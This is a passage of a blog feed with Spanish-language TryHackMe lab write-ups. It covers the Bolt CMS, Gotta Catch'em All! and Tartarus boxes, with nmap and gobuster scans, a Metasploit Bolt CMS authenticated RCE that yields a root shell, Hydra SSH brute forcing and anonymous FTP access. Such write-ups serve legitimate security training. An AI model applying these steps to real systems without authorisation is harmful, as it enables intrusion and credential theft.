&lt;img src=&#34;https://sckull.github.io/images/posts/thm/bolt/Screenshot_20200812_232759.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Además vemos que la pagina es el CMS BOLT.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/bolt/Screenshot_20200812_233333.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al ingresar con las credenciales vemos la version de Bolt.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/bolt/Screenshot_20200813_001529.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;bolt-authenticated-remote-code-execution&#34;&gt;BOLT Authenticated Remote Code Execution&lt;/h2&gt;
&lt;p&gt;Buscamos alguna vulnerabilidad o exploit para este CMS, encontramos varias en searchsploit pero ninguna afectaba a la version de la maquina (searchsploit no estaba actualizado). En &lt;a href=&#34;https://www.exploit-db.com/exploits&#34;&gt;&lt;strong&gt;exploit-db.com&lt;/strong&gt;&lt;/a&gt; encontramos un &lt;a href=&#34;https://www.exploit-db.com/exploits/48296&#34;&gt;&lt;strong&gt;Exploit que afecta a este CMS&lt;/strong&gt;&lt;/a&gt;, pero al intentar utilizar este exploit nos dio muchos errores, encontramos otro exploit para metasploit &lt;a href=&#34;https://www.rapid7.com/db/modules/exploit/unix/webapp/bolt_authenticated_rce&#34;&gt;&lt;strong&gt;Bolt CMS 3.7.0 - Authenticated Remote Code Execution&lt;/strong&gt;&lt;/a&gt;. Configuramos y ejecutamos el exploit con las credenciales que encontramos en las entradas.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/bolt/Screenshot_20200813_014522.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener una shell con usuario root y nuestra flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/bolt/Screenshot_20200813_014603.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/bolt/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/bolt/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Gotta Catch&#39;em All!</title>
        <link>https://sckull.github.io/posts/pokemon/</link>
        <pubDate>Wed, 12 Aug 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 12 Aug 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/pokemon/</guid>
        <description>Gotta Catch&amp;rsquo;em All! es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Gotta Catch&amp;rsquo;em All! es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/pokemon/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Gotta Catch&amp;rsquo;em All!&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;This room is based on the original Pokemon series. Can you obtain all the Pokemon in this room?&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;270&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/GhostlyPy&#34;&gt;GhostlyPy&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ssh (22) y el puerto http (80) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Aug 12 22:04:16 2020 as: nmap -sV -o mini_scan pokemoncatch.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; pokemoncatch.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.166.58&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.42s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Aug 12 22:05:11 2020 -- 1 IP address (1 host up) scanned in 55.08 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web de Apache en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/pokemon/Screenshot_20200812_210639.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/pokemoncatch# gobuster dir -u http://pokemoncatch.thm -w /usr/share/wordlists/dirb/common.txt -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -q -x php,html,txt
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En el index de la pagina encontramos un script en Javascript en el que tiene 10 nombres de pokemon los cuales se imprimen en la consola.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/pokemon/Screenshot_20200812_211107.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Además de ello encontramos unas etiquetas html que no existen.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/pokemon/Screenshot_20200812_212357.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;hydra---ssh&#34;&gt;HYDRA - SSH&lt;/h2&gt;
&lt;p&gt;Utilizamos los nombres de los pokemon y las etiquetas que encontramos para realizar un wordlist, y con hydra realizar un ataque de fuerza bruta a SSH.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/pokemon/Screenshot_20200812_212643.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos las credenciales y obtuvimos una shell en la maquina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/pokemon/Screenshot_20200812_212809.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el Escritorio encontramos un archivo ZIP, dentro de este se encuentra la primera flag en hex.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/pokemon/Screenshot_20200812_213103.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En la carpeta de Videos encontramos un archivo en el que contiene codigo C++ el cual realiza una impresion en la que se ve el nombre de otro usuario y su contraseña. Utilizamos las credenciales para obtener una shell con este usuario, logramos obtener una shell y nos muestra un mensaje de error de &lt;code&gt;man sudo_root&lt;/code&gt; y que debemos de utilizar &lt;code&gt;sudo comando&lt;/code&gt;, además no podemos realizar un &lt;code&gt;cd&lt;/code&gt;. Actualizamos nuestra shell a root y logramos tener acceso a la carpeta de &lt;code&gt;root&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/pokemon/Screenshot_20200812_213900.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En la carpeta &lt;code&gt;/var/www/html&lt;/code&gt; encontramos segunda flag la cual esta en Cifrado César.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/pokemon/Screenshot_20200812_214054.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos la tercera flag en la carpeta &lt;code&gt;/etc&lt;/code&gt; codificada en base64.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/pokemon/Screenshot_20200812_214541.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Finalmente en &lt;code&gt;/home&lt;/code&gt; encontramos la ultima flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/pokemon/Screenshot_20200812_214739.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/pokemon/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/pokemon/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Tartarus</title>
        <link>https://sckull.github.io/posts/tartarus/</link>
        <pubDate>Wed, 12 Aug 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 12 Aug 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/tartarus/</guid>
        <description>Tartarus es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Tartarus es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Tartarus&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;This is an beginner box based on simple enumeration of services and basic privilege escalation techniques.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;*&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/csenox&#34;&gt;csenox&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Aug 12 00:19:21 2020 as: nmap -sV -o mini_scan tartarus.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; tartarus.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.50.182&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Service Info: OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Aug 12 00:19:54 2020 -- 1 IP address (1 host up) scanned in 32.65 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
&lt;p&gt;Ingresamos por el servicio FTP con las credenciales de anonymous (anonymous:anonymous), en donde encontramos dos archivos de texto el primero es posible verlo a simple vista, el segundo tenia un pequeño truco y es que las carpetas estaban con el nombre &lt;code&gt;...&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/tartarus# ftp tartarus.thm
Connected to tartarus.thm.
&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;tartarus.thm:root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: anonymous
&lt;span class=&#34;m&#34;&gt;331&lt;/span&gt; Please specify the password.
Password:
&lt;span class=&#34;m&#34;&gt;230&lt;/span&gt; Login successful.
Remote system &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls -lah
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;05&lt;/span&gt; 21:31 .
drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;05&lt;/span&gt; 21:31 ..
drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;05&lt;/span&gt; 21:31 ...
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp            &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;05&lt;/span&gt; 21:45 test.txt
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
ftp&amp;gt; get test.txt
local: test.txt remote: test.txt
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; test.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; bytes received in 0.00 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;197.6376 kB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ...
&lt;span class=&#34;m&#34;&gt;250&lt;/span&gt; Directory successfully changed.
ftp&amp;gt; ls
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
l150 Here comes the directory listing.
s &lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
ftp&amp;gt; ls -lah
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;05&lt;/span&gt; 21:31 .
drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;05&lt;/span&gt; 21:31 ..
drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;05&lt;/span&gt; 21:31 ...
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ...
&lt;span class=&#34;m&#34;&gt;250&lt;/span&gt; Directory successfully changed.
ftp&amp;gt; ls -lah
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;05&lt;/span&gt; 21:31 .
drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;05&lt;/span&gt; 21:31 ..
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp            &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;05&lt;/span&gt; 21:45 yougotgoodeyes.txt
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
ftp&amp;gt; get yougotgoodeyes.txt
local: yougotgoodeyes.txt remote: yougotgoodeyes.txt
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; yougotgoodeyes.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
